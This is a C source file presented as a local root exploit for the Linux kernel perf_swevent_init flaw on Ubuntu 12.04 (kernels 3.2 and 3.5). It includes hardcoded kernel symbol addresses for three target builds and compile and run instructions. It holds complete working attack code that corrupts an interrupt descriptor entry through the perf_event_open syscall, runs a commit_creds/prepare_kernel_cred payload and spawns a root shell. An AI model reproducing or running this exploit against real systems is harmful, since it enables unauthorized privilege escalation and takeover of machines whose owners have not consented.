/**
 * Ubuntu 12.04 3.x x86_64 perf_swevent_init Local root exploit
 * by Vitaly Nikolenko (vnik5287@gmail.com)
 *
 * based on semtex.c by sd
 *
 * Supported targets:
 * [0] Ubuntu 12.04.0 - 3.2.0-23-generic
 * [1] Ubuntu 12.04.1 - 3.2.0-29-generic
 * [2] Ubuntu 12.04.2 - 3.5.0-23-generic
 *
 * $ gcc vnik.c -O2 -o vnik
 *
 * $ uname -r
 * 3.2.0-23-generic
 *
 * $ ./vnik 0
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>

#define BASE  0x1780000000
#define SIZE  0x0010000000
#define KSIZE 0x2000000
#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

uint64_t targets[3][3] =
            {{0xffffffff81ef67e0,  // perf_swevent_enabled
              0xffffffff81091630,  // commit_creds
              0xffffffff810918e0}, // prepare_kernel_cred
             {0xffffffff81ef67a0,
              0xffffffff81091220,
              0xffffffff810914d0},
             {0xffffffff81ef5940,
              0xffffffff8107ee30,
              0xffffffff8107f0c0}
	    };

void __attribute__((regparm(3))) payload() {
	uint32_t *fixptr = (void*)AB(1);
	// restore the handler
	*fixptr = -1;
	commit_creds_fn commit_creds = (commit_creds_fn)AB(2);
	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)AB(3);
	commit_creds(prepare_kernel_cred((uint64_t)NULL));
}

void trigger(uint32_t off) {
	uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 };
	int fd = syscall(298, buf, 0, -1, -1, 0);
	assert( !close(fd) );
}

int main(int argc, char **argv) {
	uint64_t off64, needle, kbase, *p;
	uint8_t *code;
	uint32_t int_n, j = 5, target = 1337;
	int offset = 0;
	void *map;

	assert(argc == 2 && "target?");
	assert( (target = atoi(argv[1])) < 3 );

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

	// mmap user-space block so we don't page fault
	// on sw_perf_event_destroy
	assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
	memset(map, 0, SIZE);

	asm volatile("sidt %0" : "=m" (idt));
	kbase = idt.addr & 0xff000000;
	printf("IDT addr = 0x%lx\n", idt.addr);

	assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
	memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &payload, 1024);
	memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);

	// can only play with interrupts 3, 4 and 0x80
	for (int_n = 3; int_n <= 0x80; int_n++) {
		for (off64 = 0x00000000ffffffff; (int)off64 < 0; off64--) {
			int off32 = off64;

			if ((targets[target][0] + ((uint64_t)off32)*24) == (idt.addr + int_n*16 + 8)) {
				offset = off32;
				goto out;
			}
		}
		if (int_n == 4) {
			// shit, let's try 0x80 if the kernel is compiled with
			// CONFIG_IA32_EMULATION
			int_n = 0x80 - 1;
		}
	}
out:
	assert(offset);
	printf("Using int = %d with offset = %d\n", int_n, offset);

	for (j = 0; j < 3; j++) {
		needle = AB(j+1);
		assert(p = memmem(code, 1024, &needle, 8));
		*p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
	}
	trigger(offset);
	switch (int_n) {
	case 3:
		asm volatile("int $0x03");
		break;
	case 4:
		asm volatile("int $0x04");
		break;
	case 0x80:
		asm volatile("int $0x80");
	}

	assert(!setuid(0));
	return execl("/bin/bash", "-sh", NULL);
}